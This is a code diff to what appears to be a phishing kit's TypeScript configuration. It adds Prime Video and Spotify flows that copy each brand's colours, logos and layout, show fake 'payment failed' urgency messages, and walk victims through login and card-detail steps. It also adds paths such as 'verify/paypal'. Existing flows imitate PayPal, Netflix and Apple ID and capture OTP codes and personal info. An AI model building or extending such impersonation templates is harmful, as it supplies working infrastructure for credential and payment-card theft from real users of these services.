@@ -71,6 +71,7 @@ export interface FlowConfig {
     urgency: UrgencyConfig; // Scenarios
     steps: FlowStep[];
     popular?: boolean;
+    path?: string;
 }
 
 export interface FlowStep {
@@ -154,7 +155,8 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
             { id: 'card', name: 'Card Details', type: 'card', required: false, order: 3 },
             { id: 'personal', name: 'Personal Info', type: 'personal', required: false, order: 4 }
-        ]
+        ],
+        path: 'verify/paypal'
     },
     {
         id: 'netflix',
@@ -344,6 +346,131 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             { id: 'login', name: 'Apple ID Login', type: 'login', required: true, order: 1 },
             { id: 'otp', name: '2FA Verification', type: 'otp', required: true, order: 2 }
         ]
+    },
+    {
+        id: 'prime-video',
+        name: 'Prime Video',
+        category: 'streaming',
+        icon: '📺',
+        color: '#00A8E1',
+        monthlyPrice: 15,
+        description: 'Prime Video account verification',
+        urgency: {
+            type: 'payment_decline',
+            title: 'Membership On Hold',
+            message: 'We could not process your membership fee. Please update your payment method to avoid cancellation.',
+            buttonText: 'Update Payment Method',
+            alertIcon: 'credit_card_off',
+            referencePrefix: 'PV',
+            footerLink: 'Go to Amazon.com',
+            limitations: ['Watch Prime Video', 'Rent or buy movies'],
+            resolveTitle: 'Update details'
+        },
+        theme: {
+            mode: 'dark',
+            background: { type: 'color', value: '#0F171E' },
+            layout: 'centered',
+            card: {
+                background: '#0F171E',
+                border: 'none',
+                radius: '0px',
+                shadow: 'none',
+                maxWidth: '350px',
+                padding: '20px'
+            },
+            input: {
+                style: 'outline',
+                activeColor: '#00A8E1',
+                borderRadius: '3px',
+                backgroundColor: '#ffffff',
+                textColor: '#000000',
+                labelBehavior: 'top'
+            },
+            button: {
+                background: '#00A8E1',
+                color: '#ffffff',
+                borderRadius: '3px',
+                width: 'full',
+                style: 'flat'
+            },
+            header: {
+                logoUrl: 'assets/images/logos/prime-video-logo.svg',
+                logoHeight: '40px',
+                alignment: 'center'
+            },
+            footer: {
+                style: 'simple',
+                links: [{ text: 'Terms' }, { text: 'Privacy' }, { text: 'Help' }],
+                textColor: '#8197A4'
+            }
+        },
+        steps: [
+            { id: 'login', name: 'Sign In', type: 'login', required: true, order: 1 },
+            { id: 'card', name: 'Update Payment', type: 'card', required: true, order: 2 }
+        ]
+    },
+    {
+        id: 'spotify',
+        name: 'Spotify',
+        category: 'streaming',
+        icon: '🎵',
+        color: '#1DB954',
+        monthlyPrice: 12,
+        description: 'Spotify Premium verification',
+        urgency: {
+            type: 'payment_decline',
+            title: 'Payment Failed',
+            message: 'Your Premium subscription is on hold because your payment failed.',
+            buttonText: 'Update Payment',
+            alertIcon: 'credit_card_off',
+            referencePrefix: 'SP',
+            footerLink: 'Help',
+            limitations: ['Ad-free music', 'Offline listening'],
+            resolveTitle: 'Resume Premium'
+        },
+        theme: {
+            mode: 'dark',
+            background: { type: 'color', value: '#121212' },
+            layout: 'centered',
+            card: {
+                background: '#121212',
+                border: 'none',
+                radius: '0px',
+                shadow: 'none',
+                maxWidth: '450px',
+                padding: '0px'
+            },
+            input: {
+                style: 'flat',
+                activeColor: '#1DB954',
+                borderRadius: '4px',
+                backgroundColor: '#121212',
+                textColor: '#ffffff',
+                labelBehavior: 'top'
+            },
+            button: {
+                background: '#1DB954',
+                color: '#000000',
+                borderRadius: '500px',
+                width: 'full',
+                style: 'flat'
+            },
+            header: {
+                logoUrl: 'assets/images/logos/spotify-logo.svg',
+                logoHeight: '45px',
+                alignment: 'center'
+            },
+            footer: {
+                style: 'hidden',
+                links: [],
+                textColor: '#000'
+            }
+        },
+        steps: [
+            { id: 'login', name: 'Log in', type: 'login', required: true, order: 1 },
+            { id: 'card', name: 'Update Payment', type: 'card', required: true, order: 2 }
+        ],
+        path: 'verify/spotify'
     }
 ];
 
